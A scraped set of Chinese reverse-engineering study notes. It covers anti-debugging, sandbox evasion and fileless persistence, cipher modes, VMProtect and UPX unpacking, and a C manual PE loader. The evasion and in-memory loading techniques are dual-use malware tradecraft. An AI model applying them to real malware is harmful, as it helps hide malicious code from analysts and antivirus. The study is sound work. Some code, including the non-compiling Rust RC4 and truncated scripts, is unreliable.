: 20; DWORD Alignment : 4; DWORD Reserved1 : 8; } DUMMYSTRUCTNAME; } DUMMYUNIONNAME; } IMAGE_TLS_DIRECTORY64; typedef struct _IMAGE_TLS_DIRECTORY32 { DWORD StartAddressOfRawData; DWORD EndAddressOfRawData; DWORD AddressOfIndex; // PDWORD DWORD AddressOfCallBacks; // PIMAGE_TLS_CALLBACK * DWORD SizeOfZeroFill; union { DWORD Characteristics; struct { DWORD Reserved0 : 20; DWORD Alignment : 4; DWORD Reserved1 : 8; } DUMMYSTRUCTNAME; } DUMMYUNIONNAME; } IMAGE_TLS_DIRECTORY32; typedef IMAGE_TLS_DIRECTORY32 * PIMAGE_TLS_DIRECTORY32; 可以通过在源代码中添加或者在二进制程序中手动添加。这个后续再说。 中断 调试器使用INT 3来设置软件断点，所以一种反调试技术就是在合法代码段中插入0xCC(INT 3)欺骗调试器，使其认为这些0xCC机器码是自己设置的断点。在CTF竞赛中时常会见到这个反调试手段。 BOOL CheckDebug() { __try { __asm int 3 } __except(1) { return FALSE; } return TRUE; } 上述代码中，程序正常执行的话，执行到int3的时候，会触发异常返回FALSE，但是在调试器存在的情况下，可能会返回TRUE。 按照 上述思路，还可以使用其他方式触发异常来控制程序流达到反调试的目的。 例如jmp到非法地址，除以0之类的方式。 陷阱标志位 EFLAGS寄存器的第八个比特位是陷阱标志位。如果设置了，就会产生一个单步异常。 这个异常就是f8和f7的实现原理。 BOOL CheckDebug() { __try { __asm { pushfd or word ptr[esp], 0x100 popfd nop } } __except(1) { return FALSE; } return TRUE; } 修改文件结构 有些调试器比如OD，严格按照COFF的文件格式来读取文件的，所以可以修改程序的结构，进行变异来禁止调试器启动。 可选头的最后一项 - NumberOfRvaAndSizes 他标记了后面DataDirectory数组中的元素个数 当NumberOfRvaAndSizes大于0x10时，Windows加载器将会忽略NumberOfRvaAndSizes。 但是无论NumberOfRvaAndSizes是什么值，OllyDbg都使用它。因此，设置NumberOfRvaAndSizes为一个超过0x10的值，会导致在程序退出前，OllyDbg对用户弹出一个窗口。如图所示，使用LordPE打开可执行文件，修改RVA数及大小并保存，再用OllyDbg打开，会提示错误。 这个在x32dbg系列中已经不存在这个错误了。 三、静态混淆技术 加壳 压缩壳，加密壳，各种壳 控制流平坦化 这是在静态分析中最恶心的一种方式，因为没有完美的脚本可以完全去除混淆的影响 OLLVM中使用到的一种代码保护方式，它还有2个兄弟-虚假控制流和指令替换，这3种保护方式可以累加，对于静态分析来说混淆后代码非常复杂。 控制流平坦化的主要思想就是以基本块为单位，通过一个主分发器来控制程序的执行流程。类似于VMP保护的一种形式。 while+switch的结构，其中的switch可以理解为主分发器。通过ida观察可以很清楚的发现流程图都是正方形或者长方形。 通过简单代码的对比，不难发现混淆之后的区别 会看到出现了很多的while和switch，符合了开头那张图，主分发器进行程序控制，执行完一个小块后返回主分发器 下面就是主要的代码，剩下的就是各种分发器，控制程序执行流。 复原程序主要会用到的脚本是deflat.py其中的主要原理就是angr，这个之后再说 SMC 在程序运行期间边解密边运行的一种保护，self-modifying code。 使用具有一定的代价，因为需要开辟新的执行空间。开启固定基址，关闭随机基址，关闭数据保护 类名混淆 这是在net程序中常见的一种混淆方式，对命名空间，类，方法，字段进行重命名以增加阅读难度。这也不算壳，分析起来也比较麻烦。 反混淆也很困难。 文件不落地技术 不向磁盘写入可执行文件，而是以脚本形式存在计算机中的注册表子项目中，以此来躲避杀软的检测，那么绕过了传统防病毒（AV）寻找被保存到磁盘上的文件并扫描这些文件以确定它们是否恶意的查杀方法。 （二）沙箱对抗 降低自己的曝光率，防止过早暴露自己，所以需要一些技术对抗云沙箱。 Sleep类 常规等待 出于性能考虑，沙箱在执行程序时不可能长时间等待程序执行，因此衍生出了 延时执行的反沙箱技术：利用Windows API sleep 实现休眠，致使沙箱不执行恶意程序，进而绕过沙箱检测。 同时，沙箱开发者也通过hook Api的方式，缩短或绕过sleep的时间，对抗此类反沙箱技术。 现如今也存在着五花八门的API调用实现延迟执行恶意代码的效果，如: WaitForSingleObject、NtWaitForSingleObject、SetTimer、SetWaitableTimer、CreateTimerQueueTimer、socket 中的select函数等 一个高级的沙箱往往会对这些个会造成等待的函数进行hook绕过，来促进程序执行到核心代码的位置。往往一个样本中会使用多个等待类api来对抗沙箱 Beep 在新的攻击中出现了一种利用蜂鸣器来延时执行的目的。 BOOL Beep( [in] DWORD dwFreq, # 声音频率，赫兹为单位 [in] DWORD dwDuration # 声音的持续时间，毫秒为单位 ); 上述api在蜂鸣结束之前，不会释放程序的所有权，所以可以达到一个等待的目的，同时可以设置hz大小来绕过人耳检测 Check 检查硬件环境 检查磁盘大小 检查CPU个数 软件环境 检查自己是否被注入沙箱相关的dll 检查网络环境 检查进程列表定位特殊进程 交互检查 主动探测人机交互的行为，在一定的时间间隔内，两次获取当前鼠标在屏幕上的位置坐标，比较两次位置是否变化。 参考： 反调试技术 张君涛,王轶骏,薛质. 基于angr的对抗恶意代码沙箱检测方法的研究[J]. 计算机应用与软件,2019,36(2):308-314. DOI:10.3969/j.issn.1000-386x.2019.02.054. 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-04-09 17:20:59 "},"MyArticles/Re/常见加密算法-学习.html":{"url":"MyArticles/Re/常见加密算法-学习.html","title":"加密解密学习 - 更","keywords":"","body":"rc4 利用rust实现的rc4算法，顺便熟练一下rust。 use std::io::{self, Write}; fn rc4(key: &[u8], plaintext: &[u8]) -> Vec { let mut s: [u8; 256] = [0; 256]; let mut j = 0; for i in 0..256 {s[i] = i as u8;} for i in 0..256 { j = (j + s[i] + key[i % key.len()]) % 256; s.swap(i, j); } let mut i = 0; let mut j = 0; let mut ciphertext = Vec::with_capacity(plaintext.len()); for &byte in plaintext { i = (i + 1) % 256; j = (j + s[i]) % 256; s.swap(i, j); let k = s[(s[i] + s[j]) % 256]; ciphertext.push(byte ^ k); } ciphertext } fn main() { let mut input = String::new(); print!(\"Enter your key: \"); io::stdout().flush().unwrap(); io::stdin().read_line(&mut input).unwrap(); let key = input.trim().as_bytes(); input.clear(); print!(\"Enter your text: \"); io::stdout().flush().unwrap(); io::stdin().read_line(&mut input).unwrap(); let input = input.trim().as_bytes(); let mut output = Vec::new(); loop { input.clear(); print!(\"Do you want to encrypt (e) or decrypt (d) the text? \"); io::stdout().flush().unwrap(); io::stdin().read_line(&mut input).unwrap(); let input = input.trim(); if input == \"e\" { output = rc4(key, input); println!(\"Encrypted text: {:?}\", output); break; } else if input == \"d\" { output = rc4(key, input); println!(\"Decrypted text: {:?}\", output); break; } else { println!(\"Invalid input!\"); } } } 经典的对称加密的流密码，加密解密可以套用同一套公式。 密钥 真正参与运算加密的密钥是根据输入的密钥对数组进行初始化之后的数组数据，并未输入密钥直接参与运算。 密文 密文的产生是一个直接异或的结果，与明文进行异或的值是根据初始化之后的密钥数组进行位置交换、相加、定位后的值。 特征 对于s盒的初始化 相加定位后的异或 %256 ij位置的交换 DES 参考：《图解密码技术》、https://www.ruanx.net/des/ 对称密码、分组加密、基于 Feistel network （费斯妥网络：加密的各个步骤成为“轮”，整个加密过程就是若干次轮的循环） 分组长度：典型des加密分组长度为64位（8字节），不能整除用 PKCS7 / PKCS5 填充（一般）。基于这个网络的设计，可以重复足够多的轮次，而且可以保证解密） 密钥组成：长度64位，第8、16、24、32、40、48、56、64位是校验位，使得每个密钥都有奇数个1 流程图： 密钥 首先去掉特殊的8位，剩下的56位分成两组（28bit/组） 进行循环左移，按照一定的位数移动，两组都移动 密文 明文输入之后先进行分组，分为32+32bit的形式（一组64位，8字节） 一侧明文与【对应轮次产生的子密钥（局部密钥）和另一侧明文】产生的数组进行 xor 另一侧直接落下来 这样就组成了 “密文+明文” 这样的组合,这是一轮的加密，然后对于一个正常的加密就是将上述的结果交换左右，完事继续加密。 每次加密一半，第二次根据第一次加密的结果加密另一半。因为是通过的xor操作进行的加密，所以解密过程也很简单 3des 这个是为了防止des被短时间内爆破出来而做出的改进，就是将DES重复三次，所以他的密钥长度是168bit 这个3des可以在密钥相同的情况下等价于DES加密。 解密 利用相同位置的密钥，将加密和解密对调一下就可以。 RSA 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-04-12 13:57:22 "},"MyArticles/Re/分组密码学习.html":{"url":"MyArticles/Re/分组密码学习.html","title":"分组密码","keywords":"","body":"流密码 像流水一样，从头到尾的一种加密算法。 以一定的bit位数为分组进行加密，结束一个分组的加密就继续进行下一个分组的加密，需要内部保存一个当前的加密状态。对称加密算法基本都是基于分组加密的形式而不是流密码的形式。 分组密码 AES和DES还有3DES等等都是对称加密里的分组密码模式。 模式 因为分组密码对于每一组的加密的明文都是固定长度的，一般情况下都需要对加密算法进行迭代加密。为了解决这个迭代的问题，于是有了下面的常见的几种模式（常见）： 模式的名称都是他的全名的缩写，全名我记不住。 ECB：电子密码本 CBC：密码分组链接模式 CFB：密文反馈模式 OFB：输出反馈模式 CTR：计数器模式 ECB：电子密码本 最简单的、容易被攻击的一种模式，一般没人用。 过程 将明文按照指定的大小分组，然后每一组分别加密，密文按照顺序排列成最终密文。 对应的解密模式也是将密文分组之后分别解密得到明文。 因为11对应的关系，所以被称为电子密码本。 攻击方式 观察密文中的重复序列，可以对应出明文中的重复序列，可以推测明文。 修改密文顺序，直接控制明文顺序 密文替换，利用相同算法的密文替换原来密文中的密文 CBC：密码分组链接 将前一个密文分组和当前明文分组混合起来加密，密文像链条一样相互连接。 过程 首先将本组明文和上一组的密文进行xor之后再进行加密，第一次明文用初始向量IV进行异或 解密过程：因为是xor，所以算法过程完全可逆 加密的链条就是通过xor进行连接的 攻击方式 反转IV中的bit位，通过观察第一组的变化可以达到攻击初始向量IV的效果 CFB：密文反馈 前一个密文分组，会被当作输入，送回算法的输入端（这里体现的“反馈”）。 过程 该模式的加密并不体现在明文和密文的对应上，而是对前一组密文的加密上，当前组明文和前一组密文异或得到这一组的密文。 解密过程： 思路同上述模式 特点 使用分组密码的思想实现的流密码加密方式。初始向量IV相当于一个种子，每次的加密过程相当于产生随机数的过程，但是是伪的。 攻击方式 使用重放攻击。 取相同密钥和iv的两次加密，用第一次加密的后三项内容替换第二次的后三项内容，这样就会导致解密过程中第一组成功解密，第二组密文解密失败，因为被替换，无法通过xor还原，但是后面的可以成功解密达到攻击密文的效果。 OFB：输出反馈 和CFB类似但是不同，也是加密的结果会当作输入再进行操作。但是在这种模式中，初始向量更加重要一下 与CFB模式的比较 OFB反馈的不是明文的密文，而是iv向量的密文 CTR：计数器模式 将逐次累加的计数器进行加密，生成密钥流的流密码 计数器的生成 每次加密的时候先产生一个随机值当作初始值。该数字分为两部分，前面的一部分就是随机数本身，后面的字节就是分组的序号（1，2，3，4……之类的）比如： 与OFB 都属于是流密码，所以存在异同。 ofb利用的加密的输出当作输入，该模式利用的是计数器当作输入。 特点 可以用于并行计算。因为可以以任意顺序对分组进行加密和解密，计数器的值可以由随机数和序号计算得到。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-21 23:34:25 "},"MyArticles/Re/vmp3.5unpacke.html":{"url":"MyArticles/Re/vmp3.5unpacke.html","title":"vmp3.X 工具向脱壳","keywords":"","body":"vmp壳一直是作为加密壳中的一个难啃的骨头，这次从工具使用角度学习一下这个脱壳的过程，本次尝试vmp3.4。3.x的系列都差不多 源码 #include #include #include #include void get_promt() { if(MessageBox(NULL,TEXT(\"context\"),TEXT(\"title\"),MB_OK)) { printf(\"1212121212\\n\"); } else { printf(\"error\"); } } int main() { printf(\"this is main func\\n\"); char str_ptr[] = \"please input a string: \"; char str[128]; char flag[15] = \"aabbccddeeff\"; scanf(\"%s\", str); if(strlen(str) 加壳 使用52破解上找到的vmp软件按照默认的配置对程序进行加壳 都是默认配置，模仿的是大多数的情况，也是常见的一种加密模式。实际上VMP强大之处在于它的虚拟功能，但是默认是关闭的。 得到加密后的程序。大小相比于源程序扩大20倍左右 调试 因为程序多次中断跑飞，所以这些截图可能不是来自同一次进程，所以辩证看待 调试器配置 断点 断点要求：如图 这也是调试器的默认配置，断点不宜太多，会触发vmp的完整性检测。 增强 使用插件sharpOD，这个和xdbg是通用的 添加这些功能是为了防止vmp的一个检测，然后主要选这几个就行，主要是防止被检查调试器。 区段对比 看到相较于正常程序，他出现了vmp0和1两个段。 这是正常的程序区段详情 注意一下地址的范围。 进行调试 找入口点特征 利用gcc编译的，所以需要定位一下start函数的部分，同时需要看到函数入口点的位置特征 看到这个call和jmp的结构，类似于MSVC编译的结构。 call ___security_init_cookie 跟进这个函数，发现两个函数 脱壳 直接在动态调试中找到这两个函数然后下断点，然后通过栈回溯的方式进行定位。 GetSystemTimeAsFileTime --> 在kernelbase中，直接在dll界面下断点就行 另一个同理，下好断点，断点下的要靠后一点，避免VMP的头部断点检测。 直接f9运行，程序断在如下图位置 通过内存布局定位，发现还在vmp区段里，那就继续运行，可能是其他的地方也调用了同样的api函数 直接f9就可以，然后观察啊堆栈窗口 看到返回地址更新了。这一次程序已经来到text区段算是成功进来程序本身了。 看到ida里的伪代码（未加壳的程序）如图 第一个函数已经断进程序本身了，继续运行断第二个api。 需要注意的是，断点下载了kernelbase中，重新调试的时候会出现0xc000007b错误，这时候需要顶着错误进断点界面把俩kernelbse的断点删除，或者删除xdbg的缓存或者改个文件名。 还有需要注意的是，不要一载入程序就下断点，先运行一步到程序领空之后，再去下这个api断点。 看到程序已经跳转到了正常的text段的一个程序里了。 我们开始通过ida可以看到，程序的start函数的形式是一个call+jmp的形式 所以我们继续调试下去，当进入正常text段凌空之后就不要f9了，会直接跑飞，所以慢慢调试。 来到这里，看起来结构和没加科的入口点就很相似了，看了一下基本是一样的，然后直接把eip蹦到sub指令上，然后使用一个github脚本恢复一下iat。 C:\\Users\\Rootkit\\Desktop>vmp3-import-fix -p 16200 start emualte pattern address:00401238 start emualte pattern address:00401433 start emualte pattern address:00401555 start emualte pattern address:00401730 start emualte pattern address:0040178F start emualte pattern address:004017A0 start emualte pattern address:004017A8 start emualte pattern address:004017B1 start emualte pattern address:004017BF start emualte pattern address:00401860 start emualte pattern address:0040186F start emualte pattern address:00401878 start emualte pattern address:0040188A start emualte pattern address:00401B17 start emualte pattern address:00401B6D start emualte pattern address:00401D5E start emualte pattern address:0040207F start emualte pattern address:00402091 start emualte pattern address:004020CC start emualte pattern address:00402122 start emualte pattern address:00402141 start emualte pattern address:00402187 start emualte pattern address:004021C7 start emualte pattern address:00402247 start emualte pattern address:004022AC start emualte pattern address:004026AD start emualte pattern address:004026B5 start emualte pattern address:004026BC start emualte pattern address:004026C4 start emualte pattern address:004026CC start emualte pattern address:004026D4 start emualte pattern address:004026DD start emualte pattern address:004026E5 start emualte pattern address:004026ED start emualte pattern address:004026F4 start emualte pattern address:004026FC start emualte pattern address:00402705 start emualte pattern address:0040270C start emualte pattern address:00402714 start emualte pattern address:0040271D start emualte pattern address:00402724 start emualte pattern address:0040272D start emualte pattern address:00402734 start emualte pattern address:0040273C start emualte pattern address:00402745 start emualte pattern address:0040274C start emualte pattern address:00402754 start emualte pattern address:0040275C start emualte pattern address:00402765 start emualte pattern address:0040276D VirtualAlloc IAT address:00EB0000 完事之后可以去对应的地址看一下是不是真的被复原了。经过验证那些call确实已经被还原名称了。 利用xdbg自带的脚本进行dump，直接dump就可以，dump之后通过cff去观察一下文件的几个指标： 入口点（这里的入口点和源程序的出口点一样的，并没有发生改变） 是否重定位（关掉） 然后点击下面的东西，看一下重定位 之后使用UIF工具进行IAT重建（针对这个进程）。 重建结束之后，使用另一个工具进行[fix dump][https://www.52pojie.cn/thread-66558-1-1.html]而不是xdbg去修复，这里要注意 注意这些参数，防止出问题，然后点击那个get import，之后fixdump即可 将得到的最后的文件放进ida进行查看，可以看到效果已经非常好了 总结 面对一个默认配置加壳的vmp程序的整体的脱壳思路： 定位两个关键api（kernelbase的GetSystemTimeAsFileTime、ntdll的QueryProformanceCounter）。 在api尾部下断点，不要都下载ret之前，最好有一定的辨识度。 观察堆栈，在执行完QueryProformanceCounter的断点之后注意返回text领空的情况。 在text段向上寻找程序入口点，利用dos脚本进行修复。 利用xdbg自带的脚本进行dump。 检查dump文件。 ufi修复进程，IF重建进程后修复dump文件。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-24 09:20:57 "},"MyArticles/Re/idaunpackELF.html":{"url":"MyArticles/Re/idaunpackELF.html","title":"运行时压缩壳 - IDA动调ELF脱壳","keywords":"","body":"在分析botnet木马的时候，发现了利用魔改upx压缩的样本，因为gdb没有类似于x32dbg那种方便的iat修复功能和内存dump功能，所以esp定律能用也受限。这里使用ida搭配idc脚本的方式进行脱壳，并采用 ida 的finger插件进行函数名称修复。 关键脚本 压缩壳的脱壳思路基本一致，在解压程序将内容完全解压，然后跳转到真正的入口点，把程序dump下来，然后修复一下iat就差不多了。 但是因为这里是一个botnet样本，基本都是系统调用出来的，所以iat修不修无所谓了。 下面这个idc脚本就是用来dump程序，并且修改iat的作用。 #include #define PT_LOAD 1 #define PT_DYNAMIC 2 static main(void) { auto ImageBase,StartImg,EndImg; auto e_phoff; auto e_phnum,p_offset; auto i,dumpfile; // 基地址和起始地址，这里根据实际修改，一般不用改 ImageBase=0x400000; StartImg=0x400000; EndImg=0x0; // 检查是不是elf文件 if (Dword(ImageBase)==0x7f454c46 || Dword(ImageBase)==0x464c457f ) { if(dumpfile=fopen(\"D:\\\\dumpfile\",\"wb\"))//更改路径 { // 计算程序头表的偏移和条目数量 e_phoff=ImageBase+Qword(ImageBase+0x20); Message(\"e_phoff = 0x%x\\n\", e_phoff); e_phnum=Word(ImageBase+0x38); Message(\"e_phnum = 0x%x\\n\", e_phnum); // 遍历程序头表中的每个条目 for(i=0;i 这个脚本就是从网上拿的，基本都一样。但是这样脱壳出来的程序并不是完美的，节区恢复的很差劲，只能用于基本的分析。 操作过程 操作样本：a3f72a73e146834b43dab8833e0a9cfee6d08843a4c23fdf425295e53517afce 使用ida进行远程调试，在调试到真正的入口点之后运行上述idc脚本就可以了。 start函数下个断点，然后就可以开始运行了，按照思路，单步调试还是寻找大跳转，同时也可以ctrl+s看一下有没有新增节区。 加壳的程序区段： 这里他10b718这里的函数应该就是upx的解密函数了，直接跟进就可以。 往下跟进，根据ida的特性，在解密出新的代码的时候，他不会实时识别成代码段，所以可以将进入红色地址段作为一个新的阶段，比如这里。 这个函数直接跟进去，特点就是第一个红色的call代码。 中间遇见循环直接f4往外跳就行了。因为这个样本是一个魔改的upx壳，只魔改了upx的头部，实际的解压代码改变并不大，所以当遇到upx的经典个小三循环之后，就基本上快到oep了。 走完之后遇到一个跳转，下面的call跟进去，基本就是程序的oep了 程序此时已经出来了新的区块了 然后继续f8跟进，同时观察区块，当发现出现新的区块的时候，基本可以断定是脱壳结束了。 这时候运行脚本，注意修改一下开始地址。就可以得到dump文件了。 技巧 start函数里的call全下好断点，没脱壳的时候ida显示的几个函数在retn也下好断点，经历上面的三个小循环之后直接f8往下跑，会再回到start函数，大概第二次跳回start函数，可以看到真正的区段了。但是区段是空的。 再两次就会发现新的elf出现在这个区段了 大概再有一次就到了入口点了： 多余的区段也被去除了这时。 ida在出现新的区段的时候会自己停住，也可以直接f9往下跑，当ida弹窗显示 ok之后会显示新的弹窗： 点yes之后就来到了新的区段，就是oep，这里具体还是要看压缩壳的特性来说。 成果 基本上脱壳成功了就算 main函数啥的都算是清楚 也可以正常运行 但是区段发生了明显的变化，并不是一个完整的elf，但是能运行，好神奇 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-08-24 18:33:13 "},"MyArticles/Basics.html":{"url":"MyArticles/Basics.html","title":"Basics","keywords":"","body":"合抱之木，生于毫末；百丈之台，起于垒土；千里之行，始于足下。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-19 13:38:21 "},"MyArticles/Basics/PE文件加载器.html":{"url":"MyArticles/Basics/PE文件加载器.html","title":"PE文件加载器-基于C","keywords":"","body":"PE文件从磁盘中向内存中加载映射的过程。总体思路就是将PE文件按照各种方式映射到内存中即可，通过学习PE文件向内存中加载的过程可以推导出shellcode直接加载内存执行的思路。 基本的载入流程可以概况一下步骤： 根据文件的大小申请具有合适权限的内存空间 用0进行初始化内存空间 将PE文件利用ReadFile映射进去 修改重定位表 根据PE文件的导入表，加载需要的dll。 获取导入函数的地址，写进导入表 修改PE的加载baseaddr 跳转到入口点开始执行 定位 - 利用数据目录表 typedef struct _IMAGE_DATA_DIRECTORY { DWORD VirtualAddress; DWORD Size; } IMAGE_DATA_DIRECTORY,*PIMAGE_DATA_DIRECTORY; #define IMAGE_NUMBEROF_DIRECTORY_ENTRIES 16 数据目录表（IDD）是可选头的最后一个项目。长度是16，可以这个值只有od对他是关注的，可以修改该值来反od的载入调试。里面就含有两项，一个是虚拟地址和大小。 顺序是 导出表 导入表 资源表 异常信息表 安全证书表 重定位表 调试信息表 版权所以表 全局指针表 TLS表 加载配置表 绑定导入表 IAT表 延迟导入表 COM信息表 保留 上述表中和程序加载相关就只有导入导出、重定向、IAT表这些 导出表 定位 EXE文件一般没有这个，显示的就是0 DLL程序的这个结构体很大 IDD中的该目录指向了数据目录表，这是RVA值，相对虚拟地址，在本地查看需要转换成FOA地址，文件偏移地址。 转换需要减去一个对齐，这里就是0x1000. 导出表的位置一般位于所有节区的后面，紧跟着就是导出表。 结构 typedef struct _IMAGE_EXPORT_DIRECTORY { DWORD Characteristics; DWORD TimeDateStamp; //时间戳 WORD MajorVersion; WORD MinorVersion; DWORD Name; // 指向该导出表文件名字符串 DWORD Base; // 导出函数起始序号 DWORD NumberOfFunctions; // 所有导出函数的个数 DWORD NumberOfNames; // 以函数名字导出的函数个数 DWORD AddressOfFunctions; // 导出函数地址表RVA DWORD AddressOfNames; // 导出函数名称表RVA DWORD AddressOfNameOrdinals; // 导出函数序号表RVA } IMAGE_EXPORT_DIRECTORY, * PIMAGE_EXPORT_DIRECTORY; 导入表 一般是IDD表中的第二个结构体内容，指向了导入表所在的位置。 typedef struct _IMAGE_IMPORT_DESCRIPTOR { union { DWORD Characteristics; DWORD OriginalFirstThunk; //RVA 指向IMAGE_THUNK_DATA结构数组 }; DWORD TimeDateStamp; //时间戳 DWORD ForwarderChain; DWORD Name; //RVA,指向dll名字，该名字已0结尾 DWORD FirstThunk; //RVA,指向IMAGE_THUNK_DATA结构数组 } IMAGE_IMPORT_DESCRIPTOR; typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR; 导入表在文件中的位置一般在导出表的后面，就是最后节区的后第二个。最后一个导出表结构体全是0 从010可以看到清楚的结构 在结构体中的联合体中，可以看到 union { DWORD Characteristics; DWORD OriginalFirstThunk; //RVA 指向IMAGE_THUNK_DATA结构数组 }; 【联合体内容共享内存】，这两个值保存的是同一个值，这个值可以用来遍历INT（image_name_table）导入名称表，引用博客中的一个图片 该结构体中还存在另一个指针，FirstThunk，他可以用来遍历IAT 重定位 exe一般不需要进行重定位，因为他优先加载到4G的虚拟内存中，但是dll需要。 typedef struct _IMAGE_BASE_RELOCATION { DWORD VirtualAddress; DWORD SizeOfBlock; } IMAGE_BASE_RELOCATION; typedef IMAGE_BASE_RELOCATION UNALIGNED *PIMAGE_BASE_RELOCATION; #define IMAGE_SIZEOF_BASE_RELOCATION 8 这个重定位表，最后一个结构体的标记是VirtualAddress与SizeOfBlock都为0，其他的都有意义值。该结构位于程序的最后面， 注：如果一个程序不会被别的程序加载，那么这个程序的重定位表是用不上的，因为除了内核重载的情况，主程序的2G虚拟内存空间不会被占用。 参考： PE文件加载流程_玖哥爱吃肉的博客-CSDN博客 模拟载入 根据文件的大小申请具有合适权限的内存空间 用0进行初始化内存空间 将PE文件利用ReadFile映射进去 修改重定位表（EXE不用重定位，直接忽略掉） 根据PE文件的导入表，加载需要的dll 获取导入函数的地址，写进导入表 修改PE的加载baseaddr 跳转到入口点开始执行 初始化空间 首先根据文件的映像大小申请空间并且用0初始化，因为PE文件都是用0进行对齐的。VirtualAlloc开辟地址，转换类型char，方便后续往里面写字节。 char path[] = \"C:\\\\Users\\\\rootkit\\\\Desktop\\\\loadPE\\\\64test.exe\"; // 根据PE文件结构得到映像大小 DWORD SizeOfImage = GetSizeOfPE(path, 1); printf(\"[++] size of image is [0x%x]\\n\", SizeOfImage); // 开辟可利用空间在内存中 char* chBaseAddress = (char*)VirtualAlloc(NULL, SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (NULL == chBaseAddress) { printf(\"申请进程空间失败 %d\\n\", GetLastError()); return NULL; } // 用 0 进行初始化处理 memset(chBaseAddress, 0, SizeOfImage); printf(\"[////] addr is %p\\n\", chBaseAddress); 里面的主要调用函数还是使用winnt.h里的PE结构的一些结构体，然后使用fread的方式来将内容读到结构体里 DWORD GetSizeOfPE(char* peFile, int options) { DWORD size = 0; FILE* fp = fopen(peFile, \"rb\"); // read PE e_lfnew fseek(fp, 0x3c, SEEK_SET); // get nt offset unsigned char nt_offset = 0; fread(&nt_offset, 1, 1, fp); //printf(\"->%x 将头迁移过去 头部大小不需要进行一些对齐之类的操作，所以直接复制过去就可以。大小可以直接从 nt_header.OptionalHeader.SizeOfHeaders这个值来获得。 // 计算所有头的大小 DWORD sizeofheader_all = GetSizeOfPE(path, 2); // 获取区段数量 DWORD numofsection_all = GetSizeOfPE(path, 3); // 获得程序内容 FILE* fp = fopen(path, \"rb\"); // get size of file in disk fseek(fp, 0, SEEK_END); unsigned long sizeofstaticfile = ftell(fp); // get static file context char* pe_buffer = (char*)malloc(sizeof(char) * sizeofstaticfile); fseek(fp, 0, SEEK_SET); fread(pe_buffer, 1, sizeofstaticfile, fp); // 先把头部拷过去 memcpy(chBaseAddress, pe_buffer, sizeofheader_all); 将节区迁移过去 映射节区的方式需要使用节区头来进行。复制到内存中的地址就是开辟空间的baseaddress+节区头中的对应节区的VirtualAddress的值来进行。 // 根据节区头来将节区复制到内容中去 PIMAGE_SECTION_HEADER psection_header = (PIMAGE_SECTION_HEADER)malloc(0x28); // 定位到节头表的位置 int num_section_header = GetSizeOfPE(path, 4); // 遍历所有节区，根据节区头从磁盘映射到内存中 for (i = 0; i VirtualAddress == 0 || psection_header->SizeOfRawData == 0) { psection_header++; continue; } DWORD srcaddr = psection_header->PointerToRawData; DWORD sizeofdata = psection_header->SizeOfRawData; char* section_context = (char*)malloc(sizeofdata); fseek(fp, srcaddr, SEEK_SET); fread(section_context, 1, sizeofdata, fp); // 计算对应的位置 char* destaddr = (char*)(psection_header->VirtualAddress + chBaseAddress); memcpy(destaddr, section_context, sizeofdata); printf(\"[**] %s section copy success\\n\", psection_header->Name); free(section_context); section_context = NULL; psection_header = NULL; } printf(\"section copy finish\\n\"); // 重写重定位 // 重定位后的地址 = 需要重定位的地址 - 默认加载基址 + 当前加载基址 // 重定位个屁，exe不用重定位 // 直接修复导入表 需要注意的是，上述代码在malloc的时候会时不时的出现一些问题，这些bug尚未找到解决方式，gpt给出的代码也有这个错误。 修复导入表 修复导入表就是根据PE结构中的IID结构体数组来执行。思路就是先通过IID结构体中拿到导入模块的Name的RVA，然后检查是否已经载入内存中，没有的话就loadlibrary去载入。 然后再通过OriginalFirstThunk和FirstThunk获取导入函数的名称和地址。 然后根据获得的导出名称或者是导出号，通过GetProcAddress去载入。 char* Pdllname = NULL; HMODULE hDll = NULL; PIMAGE_THUNK_DATA lpImportNameArray = NULL; PIMAGE_IMPORT_BY_NAME lpImportByName = NULL; PIMAGE_THUNK_DATA lpImportFuncAddrArray = NULL; FARPROC lpFuncAddress = NULL; PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)chBaseAddress; PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(chBaseAddress + pDos->e_lfanew); unsigned long v_size = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress; PIMAGE_IMPORT_DESCRIPTOR piid = (PIMAGE_IMPORT_DESCRIPTOR)((char*)pDos + v_size); while (1) { // 判断是不是最后一个 if (piid->OriginalFirstThunk==0) { break; } // 动态载入需要的dll Pdllname = (char*)((char*)pDos + piid->Name); // 拿到模块的句柄，没有就loadlibrary载入 hDll = GetModuleHandleA(Pdllname); if (hDll == NULL) { hDll = LoadLibraryA(Pdllname); if (hDll == NULL) { piid++; continue; } } printf(\"[>>] get IID success\\n\"); i = 0; // 获取OriginalFirstThunk以及对应的 导入函数名称表 首地址 lpImportNameArray = (PIMAGE_THUNK_DATA)((char*)pDos + piid->OriginalFirstThunk); // 获取FirstThunk以及对应的 导入函数地址表 首地址 lpImportFuncAddrArray = (PIMAGE_THUNK_DATA)((char*)pDos + piid->FirstThunk); while (TRUE) { if (lpImportNameArray[i].u1.AddressOfData == 0) { break; } // 获取IMAGE_IMPORT_BY_NAME结构 lpImportByName = (PIMAGE_IMPORT_BY_NAME)((char*)pDos + lpImportNameArray[i].u1.AddressOfData); // 判断导出函数是 序号导出 or 名称导出 if (0x80000000 & lpImportNameArray[i].u1.Ordinal) { // 序号导出 lpFuncAddress = GetProcAddress(hDll, (LPCSTR)(lpImportNameArray[i].u1.Ordinal & 0x0000FFFF)); } else { // 名称导出 lpFuncAddress = GetProcAddress(hDll, (LPCSTR)lpImportByName->Name); } lpImportFuncAddrArray[i].u1.Function = lpFuncAddress; i++; } piid++; } printf(\"[%%] reparie IAT success\\n\"); // 修改PE文件的加载基地址，设置入口点 这里的代码没有什么问题，可以正常执行。 修改EP执行 修改PE文件的入口点，然后跳到入口点去执行 // 修改PE文件的加载基地址，设置入口点 